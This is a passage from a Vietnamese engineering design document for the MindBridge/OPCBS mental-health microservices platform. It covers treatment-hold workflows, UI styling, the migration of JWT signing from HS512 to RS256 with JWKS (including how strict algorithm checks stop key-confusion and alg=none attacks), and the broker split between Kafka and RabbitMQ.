                                         @Param("startTime") Instant startTime,
                                         @Param("endTime") Instant endTime,
                                         @Param("excludeAppointmentId") Long excludeAppointmentId);
     ```

4. **Bảo Mật & Phân Quyền Bác Sĩ (Doctor Scoping)**:
   - Bác sĩ chỉ có quyền truy cập, duyệt, từ chối và ghi chú trên các lịch hẹn thuộc trách nhiệm quản lý của chính mình (`appointment.doctor.id == currentDoctorId`).

---

### 23.3. Vòng Đời Nghiệp Vụ Bảo Lưu Phác Đồ Điều Trị (Treatment Hold Lifecycle)

Tham khảo từ mô hình C# gốc (`TreatmentCase`), nghiệp vụ bảo lưu gói điều trị được nâng cấp toàn diện và bảo đảm quyền lợi thời gian của bệnh nhân:

```
[Bệnh Nhân Gửi Đơn Xin Bảo Lưu] (1 - 180 ngày)
           │
           ▼
[Bác Sĩ Phụ Trách Xem Xét Yêu Cầu]
    ├─── Duyệt Bảo Lưu:
    │      • Chuyển trạng thái phác đồ sang ON_HOLD
    │      • holdStartDate = Instant.now()
    │      • holdEndDate = holdStartDate + holdDurationDays
    │      • totalHoldDays += holdDurationDays
    │      • TỰ ĐỘNG GIA HẠN: expirationDate = expirationDate + holdDurationDays
    │
    └─── Từ Chối Bảo Lưu:
           • Ghi nhận lý do từ chối (holdRejectionReason)
           • Trả phác đồ về trạng thái ACTIVE bình thường

[Phục Hồi / Mở Lại Phác Đồ Trước Hạn (Resume)]
    • Nếu bệnh nhân hoặc bác sĩ kích hoạt lại phác đồ trước hạn holdEndDate:
      Hệ thống tự động tính số ngày bảo lưu thực tế và hoàn trả lại ngày gia hạn chưa sử dụng.
```

---

### 23.4. Quản Lý Tiến Độ Lâm Sàng & Đánh Giá Tâm Trạng (Goals & Mood Tracking)

- Cung cấp API thống kê tiến độ lâm sàng tính toán hoàn toàn ở tầng DB:
  - Tỷ lệ % hoàn thành mục tiêu điều trị (`achievedGoals / totalGoals * 100`).
  - Số buổi tham vấn đã hoàn tất (`completedSessions`).
  - Chỉ số cải thiện tâm trạng trung bình ($\Delta \text{Mood}$) đo lường trước và sau mỗi buổi trị liệu (thang điểm 1 - 10).
- Hệ thống hỗ trợ bác sĩ kê đơn mục tiêu, đánh dấu hoàn thành và ghi nhận tiến trình từng bước của người bệnh.

---

### 23.5. Kiến Trúc Microservice Thứ 9: `opcbs-blog-service` (Port 8089)

Để chuyên biệt hóa tính năng xuất bản bài viết và truyền thông y tế, `opcbs-blog-service` được triển khai dưới dạng một Microservice độc lập:
- **Port mạng**: `8089`.
- **Cơ chế duyệt bài 3 bước**:
  1. `DRAFT`: Bác sĩ soạn thảo bản nháp chuyên môn.
  2. `SUBMITTED`: Bác sĩ gửi duyệt bài viết lên Ban Biên Tập Y Khoa.
  3. `APPROVED` / `PUBLISHED`: Admin/Ban Biên Tập kiểm duyệt nội dung, duyệt xuất bản ra trang chủ hoặc từ chối kèm lý do chỉnh sửa (`REJECTED`).
- **Tương tác bạn đọc**: Độc giả xem bài viết, lượt xem tự động tăng ở tầng DB không qua cache bẩn, viết bình luận y tế tương tác.
- **Nginx Reverse Gateway**: Đã định tuyến toàn bộ upstream `/api/blogs`, `/api/doctor/blogs`, `/api/admin/blogs`, `/api/patient/blogs` về `blog_backend:8089`.
- **Docker Compose Production**: Tích hợp service `opcbs-blog-service` trong `docker-compose.prod.yml`.

---

### 23.6. Giao Diện Người Dùng 100% Tiếng Việt Đồng Bộ Chuẩn C# Gốc (`OPCBS.Web`)

- Toàn bộ thông báo, nhãn, nút bấm, tiêu đề, mã lỗi ngoại lệ backend đều sử dụng **100% Tiếng Việt**.
- Màn hình Bác Sĩ & Bệnh Nhân clone y hệt C# gốc:
  - Banner cảnh báo bảo lưu màu vàng cam cổ điển: `background: #fffbeb; border: 1px solid #fde68a !important; color: #92400e`.
  - Thanh tiến độ Progress Strip thanh mảnh, hiển thị tỷ lệ hoàn tất phác đồ và chỉ số hồi phục tâm lý.
  - Hệ thống 5 Tab lâm sàng:
    1. **Tổng quan**: Thông tin phác đồ, số buổi, ngày gia hạn, tình trạng thanh toán.
    2. **Các buổi tham vấn**: Lịch sử các phiên tham vấn, tóm tắt nội dung, bài tập về nhà, điểm tâm trạng trước/sau.
    3. **Mục tiêu điều trị**: Danh sách mục tiêu phân cấp độ ưu tiên (Cao, Trung bình, Thấp), tích chọn hoàn thành.
    4. **Hoạt động & Nhật ký**: Ghi chép hành vi lâm sàng và nhật ký tiến triển.
    5. **Hành trình điều trị**: Dòng thời gian trực quan từ ngày tiếp nhận đến ngày kết thúc phác đồ.
  - Các hộp thoại Modal chuyên biệt: Modal xin bảo lưu (1 - 180 ngày), Modal duyệt bảo lưu và Modal từ chối bảo lưu.
  - Màn hình Blog: Trang danh mục bài viết (`/blogs`), trang chi tiết bài viết y khoa (`/blogs/:id`), trang quản lý bài viết bác sĩ (`/doctor/blogs`) và trang kiểm duyệt bài viết Admin (`/admin/blogs`).

---

### 23.7. Nâng Cấp Hệ Thống Màu Sắc & Bộ Icon Y Khoa Chuyên Nghiệp Cho Navbar (Clinical Healthcare UI)

Nhằm định vị MindBridge là một nền tảng Y tế & Trị liệu tâm lý chuẩn mực lâm sàng quốc tế (tương tự chuẩn mực giao diện của Mayo Clinic, Johns Hopkins hay Vinmec Healthcare), thanh điều hướng trung tâm (Main Navbar) đã được tái thiết kế toàn diện:

1. **Bảng Màu Sắc Y Khoa Chuyên Nghiệp (Clinical Palette)**:
   - Thay thế màu xanh ngả rêu cũ bằng bộ màu **Deep Clinical Teal (`#0f766e` / `#0d9488`)** kết hợp **Hospital Slate (`#0f172a`)** và **Medical Emerald (`#10b981`)**.
   - Bổ sung dải phân cách y tế vi mô (Top Accent Clinical Bar) 3px tại đỉnh Navbar: `linear-gradient(90deg, #0f766e 0%, #0d9488 25%, #0284c7 60%, #10b981 100%)`.
   - Hiệu ứng kính mờ phủ sương y tế cao cấp: `rgba(255, 255, 255, 0.95)`, `backdrop-filter: blur(16px)`, viền mỏng `rgba(203, 213, 225, 0.85)` và bóng đổ 2 lớp triệt tiêu hiện tượng thô cứng.

2. **Huy Hiệu Thương Hiệu Y Tế (Medical Brand Emblem)**:
   - Huy hiệu `mb-brand-emblem` vuông bo góc với nền gradient ngọc lam, tích hợp biểu tượng nhịp đập tâm thất y khoa `bi-heart-pulse-fill`.
   - Bổ sung subtext nhận diện chuẩn mực: *"Hệ Thống Y Tế Tâm Lý Lâm Sàng"*.

3. **Bộ Icon Chuẩn Y Khoa Lâm Sàng Trên Toàn Bộ Menu**:
   - **Thanh menu chính**:
     - *Trang Chủ*: `bi-hospital` (Cơ sở y tế trung tâm).
     - *Đội Ngũ Bác Sĩ*: `bi-person-badge-fill` (Thẻ danh xưng bác sĩ chuyên khoa có chứng chỉ hành nghề).
     - *Trắc Nghiệm Tâm Lý*: `bi-clipboard2-pulse-fill` (Chỉ số sinh trắc & thang đo tâm thần học).
     - *Góc Nhìn Y Khoa*: `bi-journal-medical` (Tạp chí & Y văn lâm sàng).
     - Mỗi mục được bọc trong huy hiệu mềm `nav-icon-badge` 26x26px, tự động đổi màu và scale khi hover/active.

4. **Nâng Cấp Menu Người Dùng Dạng Thẻ Lâm Sàng (Clinical Glass Dropdown)**:
   - Avatar người dùng tích hợp đèn báo trạng thái trực tuyến y tế `online-pulse-indicator` màu xanh ngọc `#10b981`.
   - Dropdown menu được chia thành các phân khu chức năng y khoa mạch lạc:
     - `🩺 PHÂN HỆ BÁC SĨ LÂM SÀNG`: Tổng quan bác sĩ (`bi-grid-1x2-fill`), Lịch trực ca khám (`bi-calendar-week-fill`), Quản lý ca khám & bệnh án (`bi-clipboard2-pulse-fill`), Hồ sơ bệnh nhân (`bi-person-vcard-fill`), Phác đồ trị liệu (`bi-bandaid-fill`), Bài viết blog (`bi-journal-richtext`), Chỉ định trắc nghiệm (`bi-card-checklist`), Chứng chỉ CCHN (`bi-patch-check-fill`).
     - `💙 HỒ SƠ & TIẾN TRÌNH ĐIỀU TRỊ`: Lịch hẹn khám (`bi-calendar2-heart-fill`), Sổ bệnh án & lời dặn (`bi-file-earmark-medical-fill`), Gói trị liệu của tôi (`bi-shield-plus`), Nhật ký cảm xúc (`bi-emoji-smile-fill`), Lịch sử DASS-21 (`bi-clipboard2-check-fill`).
     - `⚡ TRUNG TÂM QUẢN TRỊ Y TẾ`: KPI hệ thống (`bi-speedometer2`), Gói dịch vụ (`bi-boxes`), Đề trắc nghiệm (`bi-ui-checks-grid`), Duyệt blog y khoa (`bi-shield-fill-check`), Quản trị người dùng & danh mục chuyên khoa.
   - Mỗi mục menu đều có hộp icon chuyên biệt `clinical-icon-box` 30x30px kèm mũi tên điều hướng vi mô `item-arrow` chỉ xuất hiện khi hover, mang lại cảm giác phần mềm y tế hiện đại, trực quan và sang trọng.

---

### 23.8. Tinh Gọn Thẻ Header Bác Sĩ & Cải Tổ Màu Sắc Sidebar Đồng Bộ Thiết Kế Gốc (Phase 13.1)

1. **Loại Bỏ Hoàn Toàn Các Nút Điều Hướng Trùng Lặp Ở Thẻ Header Bác Sĩ**:
   - *Vấn đề*: Thẻ Header phụ của Bác sĩ (`doctor-top-navbar`) trước đây tích hợp dải tab ngang (`doctor-tabs-nav`) và các nút quick action (`Lịch Khám Hôm Nay`, `Hồ Sơ Của Tôi`), gây tình trạng thanh cuộn ngang vướng víu, chật chội và trùng lặp hoàn toàn với thanh Sidebar bên trái.
   - *Khắc phục*: Loại bỏ 100% dải tab cuộn ngang và các nút bấm rườm rà. Chuyển đổi Header thành thanh **Clinical Breadcrumb & Live Status Bar** tinh gọn, cao cấp:
     - Huy hiệu `[CỔNG Y TẾ LÂM SÀNG BÁC SĨ]` mềm mại dạng pill nền `#f0fdfa` viền `#ccfbf1`.
     - Dấu phân cách `/` thanh lịch.
     - Tiêu đề module hiện tại to rõ `0.95rem`, font-weight 750, kèm icon y tế tương ứng.
     - Đèn báo trạng thái `[Phòng Khám Đang Mở (Online)]` với hiệu ứng xung nhịp pulse xanh ngọc `#10b981`.

2. **Cải Tổ Màu Sắc & Biểu Tượng Sidebar Sát 100% Bản Thiết Kế Gốc**:
   - Nâng cấp toàn bộ icon lên kích thước chuẩn mực `1.25rem` to rõ, trực quan và sắc nét.
   - Khoảng cách padding `0.65rem 0.95rem` bo góc tròn mềm `10px` (`border-radius: 10px;`).
   - Màu sắc sinh động phân tầng rực rỡ cho từng danh mục y tế:
     - `Bảng Điều Khiển Bác Sĩ`: Active nền Deep Clinical Teal `#0d766e`, chữ và icon trắng sáng; Inactive icon `#0d766e`.
     - `Bệnh Nhân & Bệnh Án`: Icon `bi-people-fill` màu **Lime xanh cốm nõn chuối sinh động `#84cc16`**.
     - `Lịch Hẹn Khám`: Icon `bi-calendar-check` màu **Emerald xanh ngọc lục bảo `#10b981`**.
     - `Khung Giờ & Ca Khám`: Icon `bi-calendar-event` màu **Sky Blue xanh dương y tế `#0284c7`**.
     - `Gói Trị Liệu & Phác Đồ`: Icon `bi-box-seam` màu **Amber vàng hổ phách `#f59e0b`**.
     - `Trắc Nghiệm Tâm Lý`: Icon `bi-clipboard2-pulse` màu **Rose đỏ san hô y tế `#f43f5e`**.
     - `Tư Vấn Trực Tuyến`: Icon `bi-chat-dots-fill` màu **Cyan xanh ngọc `#06b6d4`**.
     - `Trung Tâm Thông Báo`: Icon `bi-bell` màu **Slate xám thép `#64748b`**.
     - `Gói Hội Viên & VNPay`: Icon `bi-credit-card-2-front` màu **Teal xanh mòng két `#0d9488`**.
     - `Hồ Sơ Chuyên Gia`: Icon `bi-person-badge-fill` màu **Indigo tím chàm `#6366f1`**.
     - `Chuyên Khoa Khám`: Icon `bi-tags-fill` màu **Purple tím phong lan `#8b5cf6`**.
     - `Quản Lý Blog Y Khoa`: Icon `bi-journal-richtext` màu **Pink hồng mười giờ `#ec4899`**.
     - `Chứng Chỉ & Thẩm Định`: Icon `bi-patch-check-fill` màu **Royal Blue `#2563eb`**.
     - `Tài Khoản & Bảo Mật`: Icon `bi-person-gear` (`#475569`) và `bi-shield-lock-fill` (`#d97706`).

















---

## [BÀI 20] Nâng Cấp Bảo Mật Toàn Diện JWT: Chuyển Đổi Từ HS512 Sang RSA RS256 & Chuẩn Hóa JWKS RFC 7517

### 20.1. Understand (Mục Tiêu & Vấn Đề Của Thuật Toán Đối Xứng HS512 Trong Microservices)

1. **Hiểm họa chia sẻ khóa đối xứng (Symmetric Secret Sharing Pitfall)**:
   - Trong kiến trúc cũ sử dụng `HS512` (HMAC with SHA-512), quá trình ký (Signing) và xác minh (Verifying) dùng chung một chuỗi bí mật đối xứng (`jhipster.security.authentication.jwt.base64-secret`).
   - Do đó, cả **Auth Service** lẫn **8 Downstream Microservices** (`booking`, `clinical`, `treatment`, `psychometric`, `notification`, `payment`, `message`, `blog`) và cả Web Gateway đều phải nắm giữ cùng một chuỗi bí mật này.
   - **Hậu quả bảo mật nghiêm trọng**: Nếu một dịch vụ thứ cấp (ví dụ `opcbs-blog-service` hoặc `opcbs-notification-service`) bị khai thác lỗ hổng RCE hoặc bị rò rỉ file cấu hình / logs / biến môi trường, kẻ tấn công có thể lấy được chuỗi secret đối xứng đó và **tự ký ra bất kỳ JWT token nào** với quyền hạn tối cao `ROLE_ADMIN` để kiểm soát toàn bộ 8 microservices còn lại!

2. **Giải pháp mật mã bất đối xứng (Asymmetric Cryptography với RSA RS256)**:
   - Áp dụng nguyên tắc đặc quyền tối thiểu (Principle of Least Privilege):
     - **Auth Service (`opcbs-auth-service`)**: Là dịch vụ **duy nhất** nắm giữ **RSA Private Key** (2048-bit PKCS#8) để ký phát hành token.
     - **8 Verifying Services & Gateway**: Chỉ nhận và lưu trữ **RSA Public Key** (X.509) hoặc truy vấn động danh sách Public Keys qua chuẩn **RFC 7517 JWKS** (`/.well-known/jwks.json`).
     - Cho dù kẻ tấn công có chiếm quyền điều khiển hoàn toàn một downstream service thì cũng chỉ thu được Public Key — một thông tin công khai vốn dĩ không thể dùng để tạo chữ ký giả mạo.

```mermaid
graph TD
    Client["🌐 Client (Web / Mobile)"] -->|1. Đăng nhập /api/authenticate| Auth["🔐 opcbs-auth-service (:8081)"]
    Auth -->|2. Ký bằng RSA Private Key<br/>Header: alg=RS256, kid=opcbs-key-2026| Token["🎫 JWT (RS256)"]
    Token -->|3. Gửi Bearer Token| Nginx["🚪 Nginx Gateway / Reverse Proxy"]
    Nginx -->|4. Điều hướng request| Microservices["🏥 8 Microservices (Booking, Clinical, Payment, ...)"]
    Microservices -.->|5. Tải Public Key động| JWKS["📜 /.well-known/jwks.json<br/>(RFC 7517 JWK Set)"]
    JWKS -.->|Cung cấp Public Key X.509| Auth
    Microservices -->|6. Xác minh bằng Public Key<br/>Strict RS256 Only| Process["✅ Xử lý nghiệp vụ an toàn"]
```

---

### 20.2. Code & Architecture (Kiến Trúc & Mã Nguồn Cốt Lõi Đã Triển Khai)

#### 1. Bộ Tiện Ích RSA Đa Năng ([`RsaKeyHelper.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/security/RsaKeyHelper.java))
Được tích hợp trên toàn bộ 10 modules trong hệ thống:
- Hỗ trợ nạp khóa từ: Biến môi trường trực tiếp (`JWT_PRIVATE_KEY`, `JWT_PUBLIC_KEY`), đường dẫn file (`jwt.private-key-path`), chuỗi PEM thuần túy, hoặc chuỗi Base64 đã mã hóa.
- Tự động làm sạch các header/footer (`-----BEGIN RSA PRIVATE KEY-----`, khoảng trắng, ký tự xuống dòng).
- Tự động suy diễn (Derive) **Public Key** tương ứng trực tiếp từ Private Key dựa trên cấu trúc toán học của `RSAPrivateCrtKey` (Modulus $n$ và Public Exponent $e$), loại bỏ việc phải cấu hình kép cả public và private key ở Auth service.

#### 2. Endpoint Chuẩn Hóa JWKS RFC 7517 ([`JwkSetEndpoint.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/web/rest/JwkSetEndpoint.java))
```java
@GetMapping(value = { "/.well-known/jwks.json", "/api/jwks" }, produces = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<Map<String, Object>> getJwkSet() {
    // Luôn gọi .toPublicJWK() để lọc sạch 100% tham số private (d, p, q, dp, dq, qi)
    JWKSet publicJwkSet = new JWKSet(this.rsaJwk.toPublicJWK());
    return ResponseEntity.ok()
        .cacheControl(CacheControl.maxAge(Duration.ofMinutes(15)).cachePublic())
        .body(publicJwkSet.toJSONObject());
}
```

#### 3. Cấu Hình Ký JWT Tại Auth Service ([`SecurityJwtConfiguration.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/config/SecurityJwtConfiguration.java))
```java
@Bean
public JwtEncoder jwtEncoder(RSAKey rsaJwk) {
    JWKSource<SecurityContext> jwkSource = new ImmutableJWKSet<>(new JWKSet(rsaJwk));
    return new NimbusJwtEncoder(jwkSource);
}
```
Tại [`AuthenticateController.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-auth-service/src/main/java/com/ocbs/web/rest/AuthenticateController.java), token được ký với header chỉ định rõ `kid` và thuật toán:
```java
JwsHeader jwsHeader = JwsHeader.with(SecurityUtils.JWT_ALGORITHM) // RS256
    .keyId(jwtKeyId)                                               // opcbs-key-2026
    .build();
return this.jwtEncoder.encode(JwtEncoderParameters.from(jwsHeader, claims)).getTokenValue();
```

#### 4. Cấu Hình Xác Minh Nghiêm Ngặt Tại Verifying Services
Tại toàn bộ 8 downstream services và `mindbridge-jhipster`:
- Đã gỡ bỏ hoàn toàn `JwtEncoder` bean (ngăn downstream service ký token bừa bãi).
- Đã xóa sạch cấu hình `base64-secret`.
- Cấu hình `NimbusJwtDecoder` với cơ chế khóa cứng thuật toán RS256 (**Strict Algorithm Enforcement**):
```java
NimbusJwtDecoder.withPublicKey(publicKey)
    .signatureAlgorithm(org.springframework.security.oauth2.jose.jws.SignatureAlgorithm.RS256)
    .build();
```

---

### 20.3. Break it (Các Lỗ Hổng Bị Triệt Tiêu Sau Khi Nâng Cấp)

- **Kịch bản 1: Tấn công Algorithm Confusion (Key Confusion Attack)**:
  - *Cách thức tấn công*: Hacker lấy Public Key của server (vốn là thông tin công khai), dùng nó làm chuỗi secret đối xứng để ký token bằng thuật toán HMAC (HS256/HS512). Nếu phía decoder lỏng lẻo chấp nhận cả HMAC lẫn RSA, server sẽ lấy Public Key giải mã HMAC và coi token giả mạo là hợp lệ!
  - *Biện pháp triệt tiêu*: Verifying service cấu hình tường minh `.signatureAlgorithm(SignatureAlgorithm.RS256)`. Mọi token mang `alg=HS256`, `alg=HS512` hoặc `alg=none` đều bị Nimbus JwtDecoder ném ngay ngoại lệ `BadJwtException` và từ chối ở tầng cổng HTTP 401.
- **Kịch bản 2: Tấn công `alg=none`**:
  - Hacker xóa trường `signature` và đổi header `{"alg":"none"}` nhằm qua mặt bước kiểm tra chữ ký.
  - *Biện pháp triệt tiêu*: Đã được kiểm thử trong bộ test unit `AuthJwtRS256Test` và integration test `TokenAuthenticationIT`, đảm bảo token không chữ ký bị chặn đứng 100%.
- **Kịch bản 3: Luân chuyển khóa không làm gián đoạn hệ thống (Zero-Downtime Key Rotation)**:
  - Khi cần thay đổi khóa định kỳ (ví dụ mỗi quý):
    1. Auth Service sinh thêm cặp khóa mới với `kid="opcbs-key-2027"`.
    2. Endpoint JWKS trả về mảng chứa cả 2 khóa public: khóa cũ (`opcbs-key-2026`) và khóa mới (`opcbs-key-2027`).
    3. Token mới được ký bằng `opcbs-key-2027`. Các microservices tự động căn cứ theo trường `kid` trên JWT header để lấy đúng public key tương ứng trong JWKS cache.
    4. Toàn bộ người dùng đang đăng nhập bằng token cũ vẫn tiếp tục thao tác bình thường cho đến khi token tự hết hạn, không có hiện tượng bị logout đồng loạt.

---

### 20.4. Triển Khai Production & Chiến Lược Fail-Fast

1. **Nguyên Tắc Bất Di Bất Dịch**:
   - Không bao giờ commit Private Key hoặc Public Key thực tế vào kho lưu trữ Git hoặc Docker Image.
   - Thư mục `docker/secrets/jwt/` chỉ chứa file `.gitkeep` và được đưa vào `.gitignore`.

2. **Cơ Chế Fail-Fast Bắt Buộc Trên Profile Production**:
   - Trong `SecurityJwtConfiguration.java`:
     - Nếu profile là `prod` mà không tìm thấy Private Key (đối với Auth Service) $\rightarrow$ Ứng dụng ném ngoại lệ `IllegalStateException` và **dừng khởi động ngay lập tức**, ngăn chặn việc chạy production trong trạng thái mất an toàn.
     - Trên môi trường `dev` / `test`: Nếu lập trình viên chưa mount key, hệ thống tự động sinh một cặp khóa RSA 2048-bit in-memory tạm thời và in cảnh báo vàng `[WARN]` ra log để thuận tiện cho việc debug cục bộ mà không cản trở tiến độ.

3. **Docker Compose Production Setup**:
   - `opcbs-auth-service`: Mount duy nhất file private key từ host dưới chế độ chỉ đọc:
     ```yaml
     volumes:
       - ./secrets/jwt/private.pem:/secrets/jwt/private.pem:ro
     environment:
       - JWT_PRIVATE_KEY_PATH=/secrets/jwt/private.pem
       - JWT_KEY_ID=opcbs-prod-key-2026
     ```
   - 8 Verifying Services: Chỉ nhận biến môi trường trỏ về JWKS endpoint:
     ```yaml
     environment:
       - JWT_JWK_SET_URI=http://opcbs-auth-service:8081/.well-known/jwks.json
     depends_on:
       opcbs-auth-service:
         condition: service_healthy
     ```

---

### 20.5. Fix it & Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)

> *"Trong kiến trúc phân tán gồm 8 Microservices y tế của MindBridge, chúng tôi đã thay thế hoàn toàn cơ chế HMAC đối xứng (HS512) bằng mô hình mật mã bất đối xứng RSA RS256 và chuẩn hóa RFC 7517 JWKS. Điểm mấu chốt là Auth Service đóng vai trò Identity Provider duy nhất sở hữu RSA Private Key 2048-bit để ký token kèm Key ID (`kid`), trong khi toàn bộ 8 downstream services và Gateway chỉ xác minh token qua Public Key hoặc tải động từ JWKS endpoint. Thiết kế này vừa triệt tiêu rủi ro lộ secret dùng chung, vừa chống tấn công Algorithm Confusion bằng cách khóa cứng thuật toán RS256, đồng thời cho phép luân chuyển khóa định kỳ (Key Rotation) mà không làm gián đoạn phiên làm việc của bác sĩ và bệnh nhân."*

---

## PHẦN 21: THIẾT KẾ & TRIỂN KHAI PHÂN BỔ MESSAGE BROKER / EVENT TOÀN DIỆN CHO HỆ THỐNG MICROSERVICES (KAFKA VS RABBITMQ, OUTBOX/INBOX, IDEMPOTENCY & PHI ISOLATION)

### 21.1. WHAT - Hiện Trạng Codebase & Quyết Định Kiến Trúc

#### 1. Kiểm Kê Toàn Bộ 9 Microservices
Sau khi rà soát toàn diện codebase tại `c:\SEP_G32\SEP_G32\OPCBS-Jhipster\OPCBS-Jhipster`, hệ thống gồm 9 microservices với phân bổ trách nhiệm nghiệp vụ và cơ chế giao tiếp như sau:
1. `opcbs-auth-service` (Port 8081, MySQL, Redis): IAM, cấp phát JWT RS256, đăng ký/kích hoạt tài khoản.
2. `opcbs-booking-service` (Port 8082, MySQL): Lịch làm việc bác sĩ, đặt lịch khám, duyệt/hủy/hoàn tất ca khám.
3. `opcbs-clinical-service` (Port 8083, MySQL): Bệnh án điện tử, chẩn đoán, tiếp nhận cảnh báo nguy cơ cao.
4. `opcbs-treatment-service` (Port 8084, MySQL): Phác đồ trị liệu, trừ buổi tự động khi ca khám hoàn tất.
5. `opcbs-psychometric-service` (Port 8085, MySQL): Trắc nghiệm tâm lý DASS-21, PHQ-9, GAD-7.
6. `opcbs-notification-service` (Port 8086, MySQL): Thông báo in-app, điều phối email công việc.
7. `opcbs-payment-service` (Port 8087, MySQL, Redis): Gói hội viên bác sĩ, thanh toán VNPay Sandbox, mock checkout.
8. `opcbs-message-service` (Port 8088, MySQL): Trò chuyện bác sĩ - bệnh nhân qua WebSocket STOMP.
9. `opcbs-blog-service` (Port 8089, MySQL): Bài viết y khoa, kiểm duyệt nội dung.

#### 2. Phân Bổ Hai Message Broker: Kafka vs RabbitMQ
- **Apache Kafka (KRaft Single-Node, Port 9092)**:
  - **Mục đích**: **Domain Event Streams** lưu trữ bất biến (Immutable Event Log), nhiều consumer độc lập, replay/audit, xử lý tải cao.
  - **Topics**:
    - `opcbs-appointment-events`: Vòng đời lịch hẹn (`BOOKED`, `CONFIRMED`, `CANCELLED`, `COMPLETED`). Partition Key: `appointmentId`.
    - `opcbs-payment-events`: Kết quả thanh toán gói dịch vụ (`PAYMENT_SUCCESS`, `PAYMENT_FAILED`, `PAYMENT_REFUNDED`). Partition Key: `subscriptionId`.
    - `opcbs-user-events`: Vòng đời người dùng (`USER_REGISTERED`, `USER_ACTIVATED`). Partition Key: `userId`.
- **RabbitMQ (AMQP 0-9-1 Management Alpine, Port 5672/15672)**:
  - **Mục đích**: **Asynchronous Task/Command Worker Queues** với competing consumers, xác nhận từng message (`basic.ack`/`basic.nack`), kiểm soát lưu lượng chống nghẽn SMTP (`prefetch=10`), Dead-Letter Exchanges.
  - **Exchanges & Queues**:
    - Direct Exchange: `opcbs.direct.exchange`
    - Task Queue: `opcbs.email.dispatch.queue` (Routing Key: `opcbs.email.dispatch`)
    - Dead-Letter Exchange: `opcbs.dlx.exchange`
    - Dead-Letter Queue: `opcbs.email.dlq` (Routing Key: `opcbs.email.dlq`)
- **Giao Tiếp Đồng Bộ (Synchronous HTTP / STOMP)**:
  - `psychometric -> clinical`: Cảnh báo nguy cơ cao (Severe/Extremely Severe) qua `POST /api/clinical/psychometrics-alert` để tiếp nhận tức thì và bảo vệ thông tin sức khỏe cá nhân (PHI) khỏi việc broadcast trên broker.
  - `message-service`: WebSocket STOMP bảo mật phân quyền hội thoại 2 bên, không truyền tin nhắn chat riêng tư qua broker chung.

---

### 21.2. WHY - Tại Sao Lại Chọn Thiết Kế Này?

1. **Tại Sao Không Dùng Kafka Cho Gửi Email?**
   - Kafka được thiết kế theo mô hình Log Stream. Khi một worker gửi email bị lỗi kết nối SMTP (Google tạm thời chặn hoặc nghẽn mạng), việc retry trong partition của Kafka sẽ làm **nghẽn toàn bộ luồng xử lý (Head-of-Line Blocking)** của partition đó.
   - RabbitMQ hỗ trợ cơ chế Worker Queue với `prefetch=10`, xác nhận xử lý từng thư, và tự động chuyển routing sang Dead-Letter Queue (DLQ) khi vượt quá số lần retry mà không làm ảnh hưởng đến các email khác trong hàng đợi.

2. **Tại Sao Không Dùng RabbitMQ Cho Vòng Đời Lịch Hẹn & Thanh Toán?**
   - Sự kiện lịch hẹn (`AppointmentEvent`) cần được tiêu thụ độc lập bởi **nhiều consumer khác nhau**: `opcbs-treatment-service` (để trừ số buổi điều trị) và `opcbs-notification-service` (để tạo thông báo).
   - Kafka hỗ trợ Consumer Groups độc lập trên cùng một topic, lưu vết sự kiện lâu dài (replayability) phục vụ đối soát, và đảm bảo thứ tự sự kiện nghiêm ngặt theo từng `appointmentId` thông qua Partition Key.

3. **Tại Sao Không Phát Tin Nhắn Chat Hoặc Kết Quả Trắc Nghiệm Qua Kafka?**
   - **Bảo Vệ Thông Tin Y Tế Nhạy Cảm (PHI - Protected Health Information)**: Kết quả trắc nghiệm trầm cảm/tự hại và nội dung trao đổi lâm sàng giữa bác sĩ và bệnh nhân thuộc phạm vi bảo mật nghiêm ngặt theo HIPAA. Việc phát tán qua pub-sub topic mở rộng bán kính rủi ro (attack surface).
   - Tiếp nhận cảnh báo qua REST endpoint nội bộ có xác thực JWT là phương án an toàn, có phản hồi xác nhận trạng thái (Intake Acknowledged) tức thì.

4. **Tại Sao Phải Có Transactional Outbox / AfterCommit Synchronization?**
   - Nếu phát event trước khi commit database: Nếu transaction database bị rollback (ví dụ lỗi conflict slot hoặc constraint), message đã gửi ra ngoài sẽ khiến consumer trừ buổi hoặc gửi email sai thực tế (Phantom Events).
   - Callback `afterCommit` vẫn có thể mất event nếu process dừng sau DB commit nhưng trước broker ACK. Các domain producer cần độ tin cậy cao ghi Outbox trong cùng transaction; relay chờ broker ACK rồi mới đánh dấu đã gửi.

---

### 21.3. HOW - Chi Tiết Triển Khai Kỹ Thuật

#### 1. Chuẩn Hóa Message Envelope
Mọi domain event được đồng bộ các trường:
- `eventId`: UUID định danh duy nhất cho từng message.
- `eventType`: Loại sự kiện (VD: `APPOINTMENT_COMPLETED`, `PAYMENT_SUCCESS`, `USER_REGISTERED`).
- `eventVersion`: Phiên bản schema (mặc định `1.0`).
- `occurredAt`: Thời điểm phát sinh (`Instant.now()`).
- `aggregateId`: Khóa phân vùng thực thể (`appointmentId`, `subscriptionId`, `userId`).
- `idempotencyKey`: Khóa chống trùng lặp.
- `correlationId`: Mã truy vết chuỗi hành động giữa các service.
- `payload`: Thông tin dữ liệu nghiệp vụ đã được lược bỏ thông tin nhạy cảm.

#### 2. Triển Khai Idempotent Consumer & Inbox Pattern
Tại `opcbs-notification-service`:
- Bảng `notification_inbox` lưu vết `idempotency_key` kèm trạng thái xử lý `PROCESSED`.
- Trước khi thực hiện xử lý hoặc điều phối email, consumer kiểm tra sự tồn tại của `idempotencyKey`. Nếu đã xử lý, consumer ghi nhận idempotency replay và bỏ qua an toàn mà không sinh thông báo rác hay gửi email trùng lặp.

#### 3. Cấu Hình RabbitMQ Worker Queue Với Dead-Letter Exchange (DLX)
Tại [`RabbitMqConfiguration.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-notification-service/src/main/java/com/ocbs/config/RabbitMqConfiguration.java):
```java
@Bean
public Queue emailDispatchQueue() {
    return QueueBuilder.durable("opcbs.email.dispatch.queue")
        .withArgument("x-dead-letter-exchange", "opcbs.dlx.exchange")
        .withArgument("x-dead-letter-routing-key", "opcbs.email.dlq")
        .build();
}
```
